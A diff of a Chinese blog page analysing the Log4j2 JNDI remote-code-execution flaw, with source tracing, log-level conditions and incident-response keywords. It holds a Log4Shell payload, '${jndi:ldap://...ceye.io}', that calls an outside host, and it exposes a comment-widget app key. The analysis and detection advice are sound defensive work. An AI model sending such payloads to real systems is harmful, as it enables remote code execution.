+<pre class="line-numbers language-none"><code class="language-none">09:54:48.329 [main] ERROR com.Test.log4j.Log4jTEst - ${jndi:ldap://2lnhn2.ceye.io}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>本来这段字符串的长度是82，但是却给它改成了53，为什么呢？因为第五十三的位置就是<code>$</code>符号，也就是说<code>${jndi:ldap://2lnhn2.ceye.io}</code>这段不要了，从第53位开始append。而append的内容是什么呢？可以看到传入的参数是config.getStrSubstitutor().replace(event, value)的执行结果，其中的value就是<code>${jndi:ldap://2lnhn2.ceye.io}</code>这段字符串。replace的作用简单来说就是想要进行一个替换，我们继续跟进</p>
-<p><img src="1639729629000-1639557906309-4.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639557906309-4.png" alt="img"></p>
 <p>经过一段的嵌套调用，来到<code>Interpolator.lookup</code>，这里会通过<code>var.indexOf(PREFIX_SEPARATOR)</code>判断":"之前的字符，我们这里用的是jndi然后，就会获取针对jndi的Strlookup对象并调用Strlookup的lookup方法，如下图所示</p>
-<p><img src="1639729629000-1639558050853-5.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558050853-5.png" alt="img"></p>
 <p>那么总共有多少Strlookup的子类对象可供选择呢，可供调用的Strlookup都存放在当前Interpolator类的strLookupMap属性中，如下所示</p>
-<p><img src="1639729629000-1639558068698-6.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558068698-6.png" alt="img"></p>
 <p>然后程序的继续执行就会来到JndiLookup的lookup方法中，并调用jndiManager.lookup方法，如下图所示</p>
-<p><img src="1639729629000-1639558181829-7.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558181829-7.png" alt="img"></p>
 <p>说到这里，我们已经详细了解了logger.error()造成RCE的原理：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">前提是`MessagePatternConverter`会将日志中的消息内容为`${prefix:key}`格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。<br>而在上述的跟踪过程之后我们发现成功调用了jndilookup方法，最终达成了RCE。<br>而偏偏是jndi引起漏洞的原因为：<br>	在 Apache Log4j 2.x 的早期版本中，存在一个不安全的默认配置，允许解析 ${java:...} 形式的 JNDI 变量。这是因为 Log4j 2.x 支持使用各种各样的变量来动态地引用配置文件中的值，包括系统属性、环境变量、JNDI 变量等。然而，JNDI 变量的处理在这个过程中被滥用，导致了漏洞的出现。<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">前提是`MessagePatternConverter`会将日志中的消息内容为`${prefix:key}`格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。
+而在上述的跟踪过程之后我们发现成功调用了jndilookup方法，最终达成了RCE。
+而偏偏是jndi引起漏洞的原因为：
+	在 Apache Log4j 2.x 的早期版本中，存在一个不安全的默认配置，允许解析 ${java:...} 形式的 JNDI 变量。这是因为 Log4j 2.x 支持使用各种各样的变量来动态地引用配置文件中的值，包括系统属性、环境变量、JNDI 变量等。然而，JNDI 变量的处理在这个过程中被滥用，导致了漏洞的出现。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>那么问题就来了，logger有很多方法，除了error以外还别方法可以触发漏洞么？这里就要提到Log4j2的日志优先级问题，每个优先级对应一个数值<code>intLevel</code>记录在StandardLevel这个枚举类型中，数值越小优先级越高。如下图所示：</p>
-<p><img src="1639729629000-1639558210204-8.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558210204-8.png" alt="img"></p>
 <p>当我们执行Logger.error的时候，会调用Logger.logIfEnabled方法进行一个判断，而判断的依据就是这个日志优先级的数值大小</p>
-<p><img src="1639729629000-1639558233235-9.png" alt="img"></p>
-<p><img src="1639729630000-1639558237360-10.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729629000-1639558233235-9.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729630000-1639558237360-10.png" alt="img"></p>
 <p>跟进isEnabled方法发现，只有当前日志优先级数值小于Log4j2的200的时候，程序才会继续往下走，如下所示</p>
-<p><img src="1639729630000-1639558245631-11.png" alt="img"></p>
+<p><img src="/2023/07/29/log4j2-yuan-cheng-ming-ling-zhi-xing/1639729630000-1639558245631-11.png" alt="img"></p>
 <p>而这里日志优先级数值小于等于200的就只有"error"、“fatal”，这两个，所以logger.fatal()方法也可触发漏洞。但是"warn"、"info"等大于200的就触发不了了。</p>
 <p>但是这里也说了是默认情况下，日志优先级是以error为准，Log4j2的缺省配置文件如下所示。</p>
-<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">Configuration</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"WARN"</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">Appenders</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">Console</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Console"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"SYSTEM_OUT"</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"</span>/&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">Console</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">Appenders</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">Loggers</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">Root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">"error"</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"Console"</span>/&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">Root</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">Loggers</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">Configuration</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>WARN<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">&gt;</span></span>
+     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Console</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SYSTEM_OUT<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
+     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Console</span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">&gt;</span></span>
+     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
+     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">&gt;</span></span>
+   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">&gt;</span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>所以只需要做一点简单的修改，将<code>&lt;Root level="error"&gt;</code>中的error改成一个优先级比较低的，例如"info"这样，只要日志优先级高于或者等于info的就可以触发漏洞，修改过后如下所示</p>
-<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Configuration</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"WARN"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Appenders</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Console</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Console"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"SYSTEM_OUT"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Console</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Appenders</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Loggers</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">"info"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">AppenderRef</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"Console"</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Root</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Loggers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Configuration</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>WARN<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Console</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SYSTEM_OUT<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Console</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>关于Jndi部分的远程类加载利用可以参考实验室往常的文章：<a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E4%B8%AD-rmi-jrmp-%E4%BB%A5%E5%8F%8Ajndi%E5%A4%9A%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%AF%A6%E8%A7%A3/">Java反序列化过程中 RMI JRMP 以及JNDI多种利用方式详解</a>、<a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/">JAVA JNDI注入知识详解</a></p>
 <h2 id="0x08-入侵排查">0x08 入侵排查</h2>
 <h3 id="1-日志排查">1. 日志排查</h3>
 <p>攻击者在利用前通常采用dnslog方式进行扫描探测，对于常见利用方式可通过应用系统报错日志中对以下关键字进行排查。</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">"javax.naming.CommunicationException"</span><br><span class="hljs-string">"javax.naming.NamingException: problem generating object using object factory"</span><br><span class="hljs-string">"Error looking up JNDI resource"</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"javax.naming.CommunicationException"</span>
+<span class="token string">"javax.naming.NamingException: problem generating object using object factory"</span>
+<span class="token string">"Error looking up JNDI resource"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h3 id="2-流量排查">2. 流量排查</h3>
 <ol>
 <li>排查日志或者解码后完整的请求数据包中是否存在${jndi:关键字}。</li>
@@ -824,100 +962,7 @@
                 </div>
             </div>
             
-                <style>
-    #reward {
-        margin: 40px 0;
-        text-align: center;
-    }
-
-    #reward .reward-link {
-        font-size: 1.4rem;
-        line-height: 38px;
-    }
-
-    #reward .btn-floating:hover {
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    #rewardModal {
-        width: 320px;
-        height: 350px;
-    }
-
-    #rewardModal .reward-title {
-        margin: 15px auto;
-        padding-bottom: 5px;
-    }
-
-    #rewardModal .modal-content {
-        padding: 10px;
-    }
-
-    #rewardModal .close {
-        position: absolute;
-        right: 15px;
-        top: 15px;
-        color: rgba(0, 0, 0, 0.5);
-        font-size: 1.3rem;
-        line-height: 20px;
-        cursor: pointer;
-    }
-
-    #rewardModal .close:hover {
-        color: #ef5350;
-        transform: scale(1.3);
-        -moz-transform:scale(1.3);
-        -webkit-transform:scale(1.3);
-        -o-transform:scale(1.3);
-    }
-
-    #rewardModal .reward-tabs {
-        margin: 0 auto;
-        width: 210px;
-    }
-
-    .reward-tabs .tabs {
-        height: 38px;
-        margin: 10px auto;
-        padding-left: 0;
-    }
-
-    .reward-content ul {
-        padding-left: 0 !important;
-    }
-
-    .reward-tabs .tabs .tab {
-        height: 38px;
-        line-height: 38px;
-    }
-
-    .reward-tabs .tab a {
-        color: #fff;
-        background-color: #ccc;
-    }
-
-    .reward-tabs .tab a:hover {
-        background-color: #ccc;
-        color: #fff;
-    }
-
-    .reward-tabs .wechat-tab .active {
-        color: #fff !important;
-        background-color: #22AB38 !important;
-    }
-
-    .reward-tabs .alipay-tab .active {
-        color: #fff !important;
-        background-color: #019FE8 !important;
-    }
-
-    .reward-tabs .reward-img {
-        width: 210px;
-        height: 210px;
-    }
-</style>
-
-<div id="reward">
+                <div id="reward">
     <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
 
     <!-- Modal Structure -->
@@ -958,6 +1003,275 @@
     
 
     
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
+        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
+        serverURLs: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
 
     
 
@@ -1062,9 +1376,12 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-<!-- 代码语言 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+
+
+<!-- 代码语言 -->
 
 
 <!-- 代码块复制 -->
@@ -1074,7 +1391,6 @@
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
     </div>
@@ -1104,19 +1420,6 @@
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
             headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
         });
 
         // Set scroll toc fixed.
@@ -1180,89 +1483,42 @@
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
 
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
-
-    
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
                 <span id="year">2019-2024</span>
             
-            <span id="year">2019</span>
             <a href="/about" target="_blank">hybcx</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
             <br>
             
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">861.1k</span>
             
             
             
+                
             
             
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
             </span>
             
             
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
             </span>
             
             <br>
+
+            <!-- 运行天数提醒. -->
             
             <br>
             
@@ -1409,6 +1665,30 @@ $(function () {
 });
 </script>
 
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
     <!-- 回到顶部按钮 -->
 <div id="backTop" class="top-scroll">
     <a class="btn-floating btn-large waves-effect waves-light" href="#!">
@@ -1423,6 +1703,33 @@ $(function () {
     <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
     <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
     <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
 
     <!-- Baidu Analytics -->
 
